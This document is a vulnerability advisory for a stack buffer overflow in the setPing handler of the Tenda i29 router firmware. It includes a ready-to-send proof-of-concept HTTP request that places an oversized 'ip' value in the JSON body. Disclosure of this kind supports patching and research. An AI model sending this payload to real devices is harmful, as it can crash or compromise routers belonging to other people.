# Tenda i29  Buffer overflow vulnerability

## Firmware information

Firmware download address ：https://www.tendacn.com/download/detail-4916.html

## Affected version

Tenda i29 v1.0 V1.0.0.5

Tenda i29 v1.0 V1.0.0.2
## Vulnerability details
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231211003845.png)

In the `setPing` function, a stack overflow may occur when the value of the `ip` parameter is excessively large and is passed to variable `v19` using the `sprintf` function.
## Poc

```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 620
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"setPing":{"ip":"192.168.0.111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","times":4,"sig":"anacax"}}
```

## Author

E4L4@TalentSec Co.,Ltd